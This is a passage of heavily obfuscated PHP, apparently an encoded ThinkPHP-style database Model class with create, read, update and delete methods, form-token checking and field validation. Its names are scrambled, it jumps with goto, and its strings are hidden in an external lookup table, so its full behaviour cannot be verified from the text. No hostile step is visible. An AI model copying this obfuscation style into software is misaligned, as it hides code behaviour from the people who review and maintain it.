$AÀ÷•‚‹Ì = func_get_args(); $dˆÀ•óŠŸ­ = array_shift($AÀ÷•‚‹Ì); goto aˆÒ£˜Ÿö; aˆÒ£˜Ÿö: $f‘«Íë ‚ƒ = $dˆÀ•óŠŸ­; if (is_array($dˆÀ•óŠŸ­)) { $f‘«Íë ‚ƒ = $dˆÀ•óŠŸ­[1]; $dˆÀ•óŠŸ­ = $dˆÀ•óŠŸ­[0]; } $AİöóßöË = count($AÀ÷•‚‹Ì) - 1; goto EÏÙáòÅ½×; EÏÙáòÅ½×: if (isset($AÀ÷•‚‹Ì[$AİöóßöË]) && $AÀ÷•‚‹Ì[$AİöóßöË] === $dˆÀ•óŠŸ­) { think_exception(__CLASS__ . $AÔê¹’Úô[14] . $dˆÀ•óŠŸ­ . think_lang($AÔê¹’Úô[262])); return; } $AÀ÷•‚‹Ì[] = $dˆÀ•óŠŸ­; if (method_exists($this, $AÔê¹’Úô[263])) { $d®¹ÜœÎ·› = call_user_func_array(array($this, $AÔê¹’Úô[264]), array($f‘«Íë ‚ƒ, $AÀ÷•‚‹Ì)); if (!is_null($d®¹ÜœÎ·›) && $d®¹ÜœÎ·› !== !1) { return $d®¹ÜœÎ·›; } } goto a™ÌË¨‰ÖÇ; a™ÌË¨‰ÖÇ: $dÙà÷ö¿ç = call_user_func_array(array($this, $dˆÀ•óŠŸ­), $AÀ÷•‚‹Ì); if (method_exists($this, $AÔê¹’Úô[265])) { $d®¹ÜœÎ·› = call_user_func_array(array($this, $AÔê¹’Úô[266]), array($f‘«Íë ‚ƒ, $AÀ÷•‚‹Ì, $dÙà÷ö¿ç)); if ($d®¹ÜœÎ·›) { return $d®¹ÜœÎ·›; } } return $dÙà÷ö¿ç; goto F¢Ûö·˜; F¢Ûö·˜: } protected function _initialize() { } protected function _facade($F¯ƒôÏÇƒè) { $bâàİÈŸñé =& $_SERVER[©]; if (!empty($this->fields)) { foreach ($F¯ƒôÏÇƒè as $dßÒ³²™Š => $CÆ¼˜ë‹ÈŠ) { if (!in_array($dßÒ³²™Š, $this->fields, !0)) { unset($F¯ƒôÏÇƒè[$dßÒ³²™Š]); } elseif (is_scalar($CÆ¼˜ë‹ÈŠ)) { $this->_parseType($F¯ƒôÏÇƒè, $dßÒ³²™Š); } } } if (!empty($this->options[$bâàİÈŸñé[267]])) { $F¯ƒôÏÇƒè = array_map($this->options[$bâàİÈŸñé[267]], $F¯ƒôÏÇƒè); unset($this->options[$bâàİÈŸñé[267]]); } $this->_beforeWrite($F¯ƒôÏÇƒè); return $F¯ƒôÏÇƒè; } protected function _beforeWrite(&$c‰é×‡Ö„) { } public function add($FŞæğƒ‘Á = '', $EßÈîÆ§„Ğ = array(), $b¡ì›õï÷ = false) { goto B§ìô×Ù‹; B§ìô×Ù‹: if (empty($FŞæğƒ‘Á)) { if (!empty($this->data)) { $FŞæğƒ‘Á = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[©][268]); return !1; } } $EßÈîÆ§„Ğ = $this->_parseOptions($EßÈîÆ§„Ğ); $FŞæğƒ‘Á = $this->_facade($FŞæğƒ‘Á); goto B¦÷ôÉÉ¿Í; B¶á¯×¾¾¿: return $bçø‘¯ÕÒù; goto eÀ¥‡»”‹; B¦÷ôÉÉ¿Í: if (!1 === $this->_beforeInsert($FŞæğƒ‘Á, $EßÈîÆ§„Ğ)) { return !1; } $bçø‘¯ÕÒù = $this->db->insert($FŞæğƒ‘Á, $EßÈîÆ§„Ğ, $b¡ì›õï÷); if (!1 !== $bçø‘¯ÕÒù) { $dœôÃá›é = $this->getLastInsID(); if ($dœôÃá›é) { $FŞæğƒ‘Á[$this->getPk()] = $dœôÃá›é; $this->_after_insert($FŞæğƒ‘Á, $EßÈîÆ§„Ğ); return $dœôÃá›é; } $this->_after_insert($FŞæğƒ‘Á, $EßÈîÆ§„Ğ); } goto B¶á¯×¾¾¿; eÀ¥‡»”‹: } protected function _beforeInsert(&$Aï‡Äå–Š, $AÁñÅö•Î) { } protected function _after_insert($eÙ®µÜ¼Ú¹, $fÖ…‘¾¤Ü…) { } public function addAll($eÀÄÔğ¸µ, $F¬Êï¿êŠ = array(), $bøæŸ¯ğ™ä = false) { goto bì™ØÉ›Ñ¨; c–‰ìŒÙ³Õ: foreach ($eÀÄÔğ¸µ as $c½»å¾ë => $c¬Ÿ¥‹‹í) { $eÀÄÔğ¸µ[$c½»å¾ë] = $this->_facade($c¬Ÿ¥‹‹í); } if (method_exists($this->db, $f±Ì¤¯Ùµø[269])) { $B¼ŠÑ±…¥£ = $this->db->insertAll($eÀÄÔğ¸µ, $F¬Êï¿êŠ, $bøæŸ¯ğ™ä); } else { $this->startTrans(); foreach ($eÀÄÔğ¸µ as $c½»å¾ë => $c¬Ÿ¥‹‹í) { $B¼ŠÑ±…¥£ = $this->db->insert($c¬Ÿ¥‹‹í, $F¬Êï¿êŠ, $bøæŸ¯ğ™ä); } $this->commit(); } if (!1 !== $B¼ŠÑ±…¥£) { $EË´Ù˜²ó = $this->getLastInsID(); if ($EË´Ù˜²ó) { return $EË´Ù˜²ó; } } goto C…Íƒ—á×¢; bì™ØÉ›Ñ¨: $f±Ì¤¯Ùµø =& $_SERVER[©]; if (empty($eÀÄÔğ¸µ)) { $this->error = think_lang($f±Ì¤¯Ùµø[268]); return !1; } $F¬Êï¿êŠ = $this->_parseOptions($F¬Êï¿êŠ); goto c–‰ìŒÙ³Õ; C…Íƒ—á×¢: return $B¼ŠÑ±…¥£; goto a«ˆ›±Ó; a«ˆ›±Ó: } public function selectAdd($cÇóœÌä§ = '', $däÉ†ŞèÉĞ = '', $fö—Ò°†ˆÄ = array()) { $b“Æ¸â÷ÊÖ =& $_SERVER[©]; $fö—Ò°†ˆÄ = $this->_parseOptions($fö—Ò°†ˆÄ); if (!1 === ($Bğ•Ãµ÷ºİ = $this->db->selectInsert($cÇóœÌä§ ? $cÇóœÌä§ : $fö—Ò°†ˆÄ[$b“Æ¸â÷ÊÖ[270]], $däÉ†ŞèÉĞ ? $däÉ†ŞèÉĞ : $this->getTableName(), $fö—Ò°†ˆÄ))) { $this->error = think_lang($b“Æ¸â÷ÊÖ[271]); return !1; } else { return $Bğ•Ãµ÷ºİ; } } public function save($Aâä†¿ƒ³´ = '', $bµ°ÚÙ¶‹× = array()) { goto d§îàÓ…‚õ; d§îàÓ…‚õ: $FäÕØ÷´…— =& $_SERVER[©]; if (empty($Aâä†¿ƒ³´)) { if (!empty($this->data)) { $Aâä†¿ƒ³´ = $this->data; $this->data = array(); } else { $this->error = think_lang($FäÕØ÷´…—[268]); return !1; } } $Aâä†¿ƒ³´ = $this->_facade($Aâä†¿ƒ³´); goto AÂ¶½Õ¬Ï›; fŞ¡õ‹›–Ë: if (!1 !== $DÉßŠËõç›) { if (isset($aİÙÂÂæ¡Ù)) { $Aâä†¿ƒ³´[$Dƒ¡ÉÁ‚] = $aİÙÂÂæ¡Ù; } $this->_afterUpdate($Aâä†¿ƒ³´, $bµ°ÚÙ¶‹×); } return $DÉßŠËõç›; goto dº™Ç¸ßÉÓ; AÂ¶½Õ¬Ï›: $bµ°ÚÙ¶‹× = $this->_parseOptions($bµ°ÚÙ¶‹×); $Dƒ¡ÉÁ‚ = $this->getPk(); if (!isset($bµ°ÚÙ¶‹×[$FäÕØ÷´…—[272]])) { if (isset($Aâä†¿ƒ³´[$Dƒ¡ÉÁ‚])) { $aÒëÀÎ‘[$Dƒ¡ÉÁ‚] = $Aâä†¿ƒ³´[$Dƒ¡ÉÁ‚]; $bµ°ÚÙ¶‹×[$FäÕØ÷´…—[272]] = $aÒëÀÎ‘; unset($Aâä†¿ƒ³´[$Dƒ¡ÉÁ‚]); } else { $this->error = think_lang($FäÕØ÷´…—[271]); return !1; } } goto D³ùÅì‹ù²; D³ùÅì‹ù²: if (is_array($bµ°ÚÙ¶‹×[$FäÕØ÷´…—[272]]) && isset($bµ°ÚÙ¶‹×[$FäÕØ÷´…—[272]][$Dƒ¡ÉÁ‚])) { $aİÙÂÂæ¡Ù = $bµ°ÚÙ¶‹×[$FäÕØ÷´…—[272]][$Dƒ¡ÉÁ‚]; } if (!1 === $this->_beforeUpdate($Aâä†¿ƒ³´, $bµ°ÚÙ¶‹×)) { return !1; } $DÉßŠËõç› = $this->db->update($Aâä†¿ƒ³´, $bµ°ÚÙ¶‹×); goto fŞ¡õ‹›–Ë; dº™Ç¸ßÉÓ: } protected function _beforeUpdate(&$DËÆ¬ôƒ­¸, $Eå‚¿¡­®î) { } protected function _afterUpdate($d”îÓÎ³öÈ, $aË¢ÔÅÇ³¸) { } public function delete($Fˆø¹› à = array()) { goto d‹ÅÁÖ©…; d‹ÅÁÖ©…: $E÷µ¬™Üá =& $_SERVER[©]; if (empty($Fˆø¹› à) && empty($this->options[$E÷µ¬™Üá[272]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $fÙÅŞ´½óæ = $this->getPk(); goto dŞ‹‰šº…; B¾í†ØÛ†: $dÉé·î¨ƒ = $this->db->delete($Fˆø¹› à); if (!1 !== $dÉé·î¨ƒ) { $eÕ“Ù‚İ«ç = array(); if (isset($dŞÃâßØÄ·)) { $eÕ“Ù‚İ«ç[$fÙÅŞ´½óæ] = $dŞÃâßØÄ·; } $this->_after_delete($eÕ“Ù‚İ«ç, $Fˆø¹› à); } return $dÉé·î¨ƒ; goto dÛŒ¾•ïç–; dŞ‹‰šº…: if (is_numeric($Fˆø¹› à) || is_string($Fˆø¹› à)) { if (strpos($Fˆø¹› à, $E÷µ¬™Üá[57])) { $bÏ˜Ğ†Şô©[$fÙÅŞ´½óæ] = array($E÷µ¬™Üá[273], $Fˆø¹› à); } else { $bÏ˜Ğ†Şô©[$fÙÅŞ´½óæ] = $Fˆø¹› à; } $this->options[$E÷µ¬™Üá[272]] = $bÏ˜Ğ†Şô©; } $Fˆø¹› à = $this->_parseOptions(); if (is_array($Fˆø¹› à[$E÷µ¬™Üá[272]]) && isset($Fˆø¹› à[$E÷µ¬™Üá[272]][$fÙÅŞ´½óæ])) { $dŞÃâßØÄ· = $Fˆø¹› à[$E÷µ¬™Üá[272]][$fÙÅŞ´½óæ]; } goto B¾í†ØÛ†; dÛŒ¾•ïç–: } protected function _after_delete($BöÃåÚá™Î, $F„Ë×½œŸí) { } public function select($D¶ÖÚïÅ–© = array()) { goto bÉªå‘¿õ–; AïˆÇ¸Á: $this->_afterSelect($AôÛ‘Ÿ‰™Ö, $D¶ÖÚïÅ–©); return $AôÛ‘Ÿ‰™Ö; goto c·¡÷ ØÈ¾; bÉªå‘¿õ–: $DÖ¢Æ’§ƒ÷ =& $_SERVER[©]; if (is_string($D¶ÖÚïÅ–©) || is_numeric($D¶ÖÚïÅ–©)) { $F¤½œƒÏˆ… = $this->getPk(); if (strpos($D¶ÖÚïÅ–©, $DÖ¢Æ’§ƒ÷[57])) { $C¬–¤‹æ£Ù[$F¤½œƒÏˆ…] = array($DÖ¢Æ’§ƒ÷[273], $D¶ÖÚïÅ–©); } else { $C¬–¤‹æ£Ù[$F¤½œƒÏˆ…] = $D¶ÖÚïÅ–©; } $this->options[$DÖ¢Æ’§ƒ÷[272]] = $C¬–¤‹æ£Ù; } elseif (!1 === $D¶ÖÚïÅ–©) { $D¶ÖÚïÅ–© = $this->_parseOptions(); return $DÖ¢Æ’§ƒ÷[274] . $this->db->buildSelectSql($D¶ÖÚïÅ–©) . $DÖ¢Æ’§ƒ÷[275]; } $D¶ÖÚïÅ–© = $this->_parseOptions(); goto d„³ŞÂé³˜; d„³ŞÂé³˜: $AôÛ‘Ÿ‰™Ö = $this->db->select($D¶ÖÚïÅ–©); if (!1 === $AôÛ‘Ÿ‰™Ö) { return !1; } if (empty($AôÛ‘Ÿ‰™Ö)) { return null; } goto AïˆÇ¸Á; c·¡÷ ØÈ¾: } protected function _afterSelect(&$bÁã„é¦‰—, $D—­»ší) { } public function buildSql($f‹…¨Š¦Œ… = array()) { $eÔ•¡ºàáÄ =& $_SERVER[©]; $f‹…¨Š¦Œ… = $this->_parseOptions($f‹…¨Š¦Œ…); return $eÔ•¡ºàáÄ[274] . $this->db->buildSelectSql($f‹…¨Š¦Œ…) . $eÔ•¡ºàáÄ[275]; } public function optionsValue($dİİŠÆ™ó» = null) { if (is_null($dİİŠÆ™ó»)) { return $this->options; } elseif (is_array($dİİŠÆ™ó»)) { $this->options = array_merge($this->options, $dİİŠÆ™ó»); } } protected function _parseOptions($B®éßã± = array()) { goto eĞŞ¢…Õƒ™; eĞŞ¢…Õƒ™: $B¬Èº‰ˆ©‡ =& $_SERVER[©]; if (is_array($B®éßã±)) { $B®éßã± = array_merge($this->options, $B®éßã±); } $this->options = array(); goto d–éŸ³ƒ–; d–éŸ³ƒ–: if (!isset($B®éßã±[$B¬Èº‰ˆ©‡[276]])) { $B®éßã±[$B¬Èº‰ˆ©‡[276]] = $this->getTableName(); $bšŠ½öÕ¨ = $this->fields; } else { $bšŠ½öÕ¨ = $this->getDbFields(); } if (!empty($B®éßã±[$B¬Èº‰ˆ©‡[277]])) { $B®éßã±[$B¬Èº‰ˆ©‡[276]] .= $B¬Èº‰ˆ©‡[60] . $B®éßã±[$B¬Èº‰ˆ©‡[277]]; } $B®éßã±[$B¬Èº‰ˆ©‡[278]] = $this->name; goto DŞ«ìæå…; DŞ«ìæå…: if (isset($B®éßã±[$B¬Èº‰ˆ©‡[272]]) && is_array($B®éßã±[$B¬Èº‰ˆ©‡[272]]) && !empty($bšŠ½öÕ¨) && !isset($B®éßã±[$B¬Èº‰ˆ©‡[279]]) && !isset($B®éßã±[$B¬Èº‰ˆ©‡[276]])) { foreach ($B®éßã±[$B¬Èº‰ˆ©‡[272]] as $cÍ©íù‹½Ü => $BÜ·éØˆÄî) { $cÍ©íù‹½Ü = trim($cÍ©íù‹½Ü); if (in_array($cÍ©íù‹½Ü, $bšŠ½öÕ¨, !0)) { if (is_scalar($BÜ·éØˆÄî)) { $this->_parseType($B®éßã±[$B¬Èº‰ˆ©‡[272]], $cÍ©íù‹½Ü); } } elseif (!is_numeric($cÍ©íù‹½Ü) && $B¬Èº‰ˆ©‡[80] != substr($cÍ©íù‹½Ü, 0, 1) && !1 === strpos($cÍ©íù‹½Ü, $B¬Èº‰ˆ©‡[101]) && !1 === strpos($cÍ©íù‹½Ü, $B¬Èº‰ˆ©‡[257]) && !1 === strpos($cÍ©íù‹½Ü, $B¬Èº‰ˆ©‡[280]) && !1 === strpos($cÍ©íù‹½Ü, $B¬Èº‰ˆ©‡[281])) { unset($B®éßã±[$B¬Èº‰ˆ©‡[272]][$cÍ©íù‹½Ü]); } } } $this->_options_filter($B®éßã±); return $B®éßã±; goto Eâ»ğáêĞì; Eâ»ğáêĞì: } protected function _options_filter(&$A³«¨ªÑµì) { } protected function _parseType(&$f“Í”˜´, $bäÎì‹èñ‘) { $D”ğŒÏˆ» =& $_SERVER[©]; if (empty($this->options[$D”ğŒÏˆ»[282]][$D”ğŒÏˆ»[14] . $bäÎì‹èñ‘])) { $eª£™ãèÜ¬ = strtolower($this->fields[$D”ğŒÏˆ»[249]][$bäÎì‹èñ‘]); if (!1 !== strpos($eª£™ãèÜ¬, $D”ğŒÏˆ»[283])) { } elseif (!1 === strpos($eª£™ãèÜ¬, $D”ğŒÏˆ»[284]) && !1 !== strpos($eª£™ãèÜ¬, $D”ğŒÏˆ»[285])) { $f“Í”˜´[$bäÎì‹èñ‘] = intval($f“Í”˜´[$bäÎì‹èñ‘]); } elseif (!1 !== strpos($eª£™ãèÜ¬, $D”ğŒÏˆ»[286]) || !1 !== strpos($eª£™ãèÜ¬, $D”ğŒÏˆ»[287])) { $f“Í”˜´[$bäÎì‹èñ‘] = floatval($f“Í”˜´[$bäÎì‹èñ‘]); } elseif (!1 !== strpos($eª£™ãèÜ¬, $D”ğŒÏˆ»[288])) { $f“Í”˜´[$bäÎì‹èñ‘] = (bool) $f“Í”˜´[$bäÎì‹èñ‘]; } } } public function find($C­£›É¾Ù³ = array()) { goto C²ÃÀĞ™¥; BŒ„íáİù: if (!empty($this->options[$f½ÅÉ¡Ù¥Ù[290]])) { return $this->returnResult($this->data, $this->options[$f½ÅÉ¡Ù¥Ù[290]]); } return $this->data; goto b¡¡®Š•‘‡; Cëó Š²ª«: $C­£›É¾Ù³ = $this->_parseOptions(); $D›Ê½§İ¤ = $this->db->select($C­£›É¾Ù³); if (!1 === $D›Ê½§İ¤) { return !1; } goto CËè¯á®õ»; C²ÃÀĞ™¥: $f½ÅÉ¡Ù¥Ù =& $_SERVER[©]; if (is_numeric($C­£›É¾Ù³) || is_string($C­£›É¾Ù³)) { $Dæ–áñ…Ş‘[$this->getPk()] = intval($C­£›É¾Ù³); $this->options[$f½ÅÉ¡Ù¥Ù[272]] = $Dæ–áñ…Ş‘; } $this->options[$f½ÅÉ¡Ù¥Ù[289]] = 1; goto Cëó Š²ª«; CËè¯á®õ»: if (empty($D›Ê½§İ¤)) { return null; } $this->data = $D›Ê½§İ¤[0]; $this->_afterFind($this->data, $C­£›É¾Ù³); goto BŒ„íáİù; b¡¡®Š•‘‡: } protected function _afterFind(&$aÒ®›Ÿªñ÷, $F¬”Ë­Ì¡º) { } protected function returnResult($E¡èŒçº», $BÅùŠêª¹Á = '') { $eÛÄ·‚¾¯Ê =& $_SERVER[©]; if ($BÅùŠêª¹Á) { if (is_callable($BÅùŠêª¹Á)) { return call_user_func($BÅùŠêª¹Á, $E¡èŒçº»); } switch (strtolower($BÅùŠêª¹Á)) { case $eÛÄ·‚¾¯Ê[291]: return json_encode($E¡èŒçº»); case $eÛÄ·‚¾¯Ê[292]: return xml_encode($E¡èŒçº»); } } return $E¡èŒçº»; } public function parseFieldsMap($Aë”½‡Ù×², $b¬—©ß”‹ğ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $eíÄğ¬¬ => $c†Ãœì‰) { if ($b¬—©ß”‹ğ == 1) { if (isset($Aë”½‡Ù×²[$c†Ãœì‰])) { $Aë”½‡Ù×²[$eíÄğ¬¬] = $Aë”½‡Ù×²[$c†Ãœì‰]; unset($Aë”½‡Ù×²[$c†Ãœì‰]); } } else { if (isset($Aë”½‡Ù×²[$eíÄğ¬¬])) { $Aë”½‡Ù×²[$c†Ãœì‰] = $Aë”½‡Ù×²[$eíÄğ¬¬]; unset($Aë”½‡Ù×²[$eíÄğ¬¬]); } } } } return $Aë”½‡Ù×²; } public function setField($f¢˜š‰–ÁĞ, $Cœóäƒø…ù = '') { if (is_array($f¢˜š‰–ÁĞ)) { $bÀŸÀ¥ì„• = $f¢˜š‰–ÁĞ; } else { $bÀŸÀ¥ì„•[$f¢˜š‰–ÁĞ] = $Cœóäƒø…ù; } return $this->save($bÀŸÀ¥ì„•); } public function setAdd($f²‘Å‘ì°é, $eäÓÀªÚ²Î = 1) { $EæËÒ—šêÂ =& $_SERVER[©]; $AËîÀˆİ‘ = $f²‘Å‘ì°é . $EæËÒ—šêÂ[293] . $eäÓÀªÚ²Î; if ($eäÓÀªÚ²Î < 0) { $AËîÀˆİ‘ = $f²‘Å‘ì°é . $eäÓÀªÚ²Î; } return $this->setField($f²‘Å‘ì°é, array($EæËÒ—šêÂ[294], $AËîÀˆİ‘)); } public function getField($B“ƒ‰Û´ä, $FÚ‰¾ˆªì = null) { $cÓ·ç¼Ïºá =& $_SERVER[©]; $aï²¶Ô¦Ñ–[$cÓ·ç¼Ïºá[270]] = $B“ƒ‰Û´ä; $aï²¶Ô¦Ñ– = $this->_parseOptions($aï²¶Ô¦Ñ–); $B“ƒ‰Û´ä = trim($B“ƒ‰Û´ä); if (strpos($B“ƒ‰Û´ä, $cÓ·ç¼Ïºá[57])) { if (!isset($aï²¶Ô¦Ñ–[$cÓ·ç¼Ïºá[289]])) { $aï²¶Ô¦Ñ–[$cÓ·ç¼Ïºá[289]] = is_numeric($FÚ‰¾ˆªì) ? $FÚ‰¾ˆªì : $cÓ·ç¼Ïºá[43]; } $b¾‹‰–æ·‰ = $this->db->select($aï²¶Ô¦Ñ–); if (!empty($b¾‹‰–æ·‰)) { goto eâ·™³Â¸Î; D¶›ôÌ“Î´: $b¬ï·ä¨Í® = array_shift($B“ƒ‰Û´ä); $bï«¿©ˆË‘ = array(); $f¥Ó¯¾è„ï = count($aö²³à†¸); goto e–ĞÂÃ†; eâ·™³Â¸Î: $aö²³à†¸ = explode($cÓ·ç¼Ïºá[57], $B“ƒ‰Û´ä); $B“ƒ‰Û´ä = array_keys($b¾‹‰–æ·‰[0]); $dÇ¨àš„×‘ = array_shift($B“ƒ‰Û´ä); goto D¶›ôÌ“Î´; e–ĞÂÃ†: foreach ($b¾‹‰–æ·‰ as $eŒ„ƒ…œÙ) { $dƒÎ²‹À¾± = $eŒ„ƒ…œÙ[$dÇ¨àš„×‘]; if (2 == $f¥Ó¯¾è„ï) { $bï«¿©ˆË‘[$dƒÎ²‹À¾±] = $eŒ„ƒ…œÙ[$b¬ï·ä¨Í®]; } else { $bï«¿©ˆË‘[$dƒÎ²‹À¾±] = is_string($FÚ‰¾ˆªì) ? implode($FÚ‰¾ˆªì, $eŒ„ƒ…œÙ) : $eŒ„ƒ…œÙ; } } return $bï«¿©ˆË‘; goto fÆ¼Á°‘×; fÆ¼Á°‘×: } } else { if (!0 !== $FÚ‰¾ˆªì) { $aï²¶Ô¦Ñ–[$cÓ·ç¼Ïºá[289]] = is_numeric($FÚ‰¾ˆªì) ? $FÚ‰¾ˆªì : 1; } if ($FÚ‰¾ˆªì === $cÓ·ç¼Ïºá[252]) { unset($aï²¶Ô¦Ñ–[$cÓ·ç¼Ïºá[289]]); } $eŒ„ƒ…œÙ = $this->db->select($aï²¶Ô¦Ñ–); if (!empty($eŒ„ƒ…œÙ)) { if ($FÚ‰¾ˆªì === $cÓ·ç¼Ïºá[252]) { return reset($eŒ„ƒ…œÙ[0]); } if (!0 !== $FÚ‰¾ˆªì && 1 == $aï²¶Ô¦Ñ–[$cÓ·ç¼Ïºá[289]]) { return reset($eŒ„ƒ…œÙ[0]); } foreach ($eŒ„ƒ…œÙ as $C°”‰¶‚Õğ) { $dÎˆ£İÁšã[] = $C°”‰¶‚Õğ[$B“ƒ‰Û´ä]; } return $dÎˆ£İÁšã; } } return null; } public function create($AÊÊÅ¬ÀšÆ = '', $a‹‚Ú»ÈÇ™ = '') { goto AªëÇ‡Éô¤; Dª¤²ÛÎŸõ: return $AÊÊÅ¬ÀšÆ; goto AÎ¸®„Ë…·; AªëÇ‡Éô¤: $AÊã¶†„Çò =& $_SERVER[©]; if (empty($AÊÊÅ¬ÀšÆ)) { $AÊÊÅ¬ÀšÆ = $_POST; } elseif (is_object($AÊÊÅ¬ÀšÆ)) { $AÊÊÅ¬ÀšÆ = get_object_vars($AÊÊÅ¬ÀšÆ); } if (empty($AÊÊÅ¬ÀšÆ) || !is_array($AÊÊÅ¬ÀšÆ)) { $this->error = think_lang($AÊã¶†„Çò[268]); return !1; } goto dÌ›¿åëš—; F›™¯Ü—¦: if (isset($DÙìÇã–ãÓ)) { if (is_string($DÙìÇã–ãÓ)) { $DÙìÇã–ãÓ = explode($AÊã¶†„Çò[57], $DÙìÇã–ãÓ); } if (think_config($AÊã¶†„Çò[295])) { $DÙìÇã–ãÓ[] = think_config($AÊã¶†„Çò[296]); } foreach ($AÊÊÅ¬ÀšÆ as $EêÙå˜‚Ü¬ => $aêÄÆ«³Ã) { if (!in_array($EêÙå˜‚Ü¬, $DÙìÇã–ãÓ)) { unset($AÊÊÅ¬ÀšÆ[$EêÙå˜‚Ü¬]); } } } if (!$this->autoValidation($AÊÊÅ¬ÀšÆ, $a‹‚Ú»ÈÇ™)) { return !1; } if (!$this->autoCheckToken($AÊÊÅ¬ÀšÆ)) { $this->error = think_lang($AÊã¶†„Çò[297]); return !1; } goto eŸŠµ‰½òÀ; dÌ›¿åëš—: $AÊÊÅ¬ÀšÆ = $this->parseFieldsMap($AÊÊÅ¬ÀšÆ, 0); $a‹‚Ú»ÈÇ™ = $a‹‚Ú»ÈÇ™ ? $a‹‚Ú»ÈÇ™ : (!empty($AÊÊÅ¬ÀšÆ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$AÊã¶†„Çò[270]])) { $DÙìÇã–ãÓ = $this->options[$AÊã¶†„Çò[270]]; unset($this->options[$AÊã¶†„Çò[270]]); } elseif ($a‹‚Ú»ÈÇ™ == THINK_MODEL_INSERT && isset($this->insertFields)) { $DÙìÇã–ãÓ = $this->insertFields; } elseif ($a‹‚Ú»ÈÇ™ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $DÙìÇã–ãÓ = $this->updateFields; } goto F›™¯Ü—¦; eŸŠµ‰½òÀ: if ($this->autoCheckFields) { $DÙìÇã–ãÓ = $this->getDbFields(); foreach ($AÊÊÅ¬ÀšÆ as $EêÙå˜‚Ü¬ => $aêÄÆ«³Ã) { if (!in_array($EêÙå˜‚Ü¬, $DÙìÇã–ãÓ)) { unset($AÊÊÅ¬ÀšÆ[$EêÙå˜‚Ü¬]); } elseif (MAGIC_QUOTES_GPC && is_string($aêÄÆ«³Ã)) { $AÊÊÅ¬ÀšÆ[$EêÙå˜‚Ü¬] = stripslashes($aêÄÆ«³Ã); } } } $this->autoOperation($AÊÊÅ¬ÀšÆ, $a‹‚Ú»ÈÇ™); $this->data = $AÊÊÅ¬ÀšÆ; goto Dª¤²ÛÎŸõ; AÎ¸®„Ë…·: } public function autoCheckToken($fœí»ŒĞí·) { $BœÔÀ„âÛ… =& $_SERVER[©]; if (isset($this->options[$BœÔÀ„âÛ…[298]]) && !$this->options[$BœÔÀ„âÛ…[298]]) { return !0; } if (think_config($BœÔÀ„âÛ…[295])) { $A§©à‰Ø´ = think_config($BœÔÀ„âÛ…[296]); if (!isset($fœí»ŒĞí·[$A§©à‰Ø´]) || Session::get($A§©à‰Ø´)) { return !1; } list($FÀ ²Œ±, $e…†æƒòÇ©) = explode($BœÔÀ„âÛ…[80], $fœí»ŒĞí·[$A§©à‰Ø´]); if ($e…†æƒòÇ© && Session::get($A§©à‰Ø´ . $BœÔÀ„âÛ…[101] . $FÀ ²Œ±) === $e…†æƒòÇ©) { Session::remove($A§©à‰Ø´ . $BœÔÀ„âÛ…[101] . $FÀ ²Œ±); return !0; } if (think_config($BœÔÀ„âÛ…[299])) { Session::remove($A§©à‰Ø´ . $BœÔÀ„âÛ…[101] . $FÀ ²Œ±); } return !1; } return !0; } public function regex($bÍ¬©ª¹„á, $b´‹‹Ì×îí) { $cÃÄ“É»ì =& $_SERVER[©]; $CãÒÄ¡„Ôµ = array($cÃÄ“É»ì[300] => $cÃÄ“É»ì[301], $cÃÄ“É»ì[302] => $cÃÄ“É»ì[303], $cÃÄ“É»ì[304] => $cÃÄ“É»ì[305], $cÃÄ“É»ì[306] => $cÃÄ“É»ì[307], $cÃÄ“É»ì[308] => $cÃÄ“É»ì[309], $cÃÄ“É»ì[310] => $cÃÄ“É»ì[311], $cÃÄ“É»ì[312] => $cÃÄ“É»ì[313], $cÃÄ“É»ì[287] => $cÃÄ“É»ì[314], $cÃÄ“É»ì[315] => $cÃÄ“É»ì[316]); if (isset($CãÒÄ¡„Ôµ[strtolower($b´‹‹Ì×îí)])) { $b´‹‹Ì×îí = $CãÒÄ¡„Ôµ[strtolower($b´‹‹Ì×îí)]; } return preg_match($b´‹‹Ì×îí, $bÍ¬©ª¹„á) === 1; } private function autoOperation(&$dÒÛøÀ§¦„, $BÅÓ°ù£‚µ) { $E¶ëØĞƒ®ö =& $_SERVER[©]; if (!empty($this->options[$E¶ëØĞƒ®ö[317]])) { $F î¿­Ç°÷ = $this->options[$E¶ëØĞƒ®ö[317]]; unset($this->options[$E¶ëØĞƒ®ö[317]]); } elseif (!empty($this->_auto)) { $F î¿­Ç°÷ = $this->_auto; } if (isset($F î¿­Ç°÷)) { foreach ($F î¿­Ç°÷ as $d¿–¾ß†) { if (empty($d¿–¾ß†[2])) { $d¿–¾ß†[2] = THINK_MODEL_INSERT; } if ($BÅÓ°ù£‚µ == $d¿–¾ß†[2] || $d¿–¾ß†[2] == THINK_MODEL_BOTH) { switch (trim($d¿–¾ß†[3])) { case $E¶ëØĞƒ®ö[318]: case $E¶ëØĞƒ®ö[319]: $cñ·ÓÆ§†À = isset($d¿–¾ß†[4]) ? (array) $d¿–¾ß†[4] : array(); if (isset($dÒÛøÀ§¦„[$d¿–¾ß†[0]])) { array_unshift($cñ·ÓÆ§†À, $dÒÛøÀ§¦„[$d¿–¾ß†[0]]); } if ($E¶ëØĞƒ®ö[318] == $d¿–¾ß†[3]) { $dÒÛøÀ§¦„[$d¿–¾ß†[0]] = call_user_func_array($d¿–¾ß†[1], $cñ·ÓÆ§†À); } else { $dÒÛøÀ§¦„[$d¿–¾ß†[0]] = call_user_func_array(array(&$this, $d¿–¾ß†[1]), $cñ·ÓÆ§†À); } break; case $E¶ëØĞƒ®ö[270]: $dÒÛøÀ§¦„[$d¿–¾ß†[0]] = $dÒÛøÀ§¦„[$d¿–¾ß†[1]]; break; case $E¶ëØĞƒ®ö[320]: if ($E¶ëØĞƒ®ö[43] === $dÒÛøÀ§¦„[$d¿–¾ß†[0]]) { unset($dÒÛøÀ§¦„[$d¿–¾ß†[0]]); } break; case $E¶ëØĞƒ®ö[321]: default: $dÒÛøÀ§¦„[$d¿–¾ß†[0]] = $d¿–¾ß†[1]; } if (!1 === $dÒÛøÀ§¦„[$d¿–¾ß†[0]]) { unset($dÒÛøÀ§¦„[$d¿–¾ß†[0]]); } } } } return $dÒÛøÀ§¦„; } protected function autoValidation($cÁ¿Ãóƒ…¥, $A¤•Á¥å¯ˆ) { $dÙš¢ĞŞÓš =& 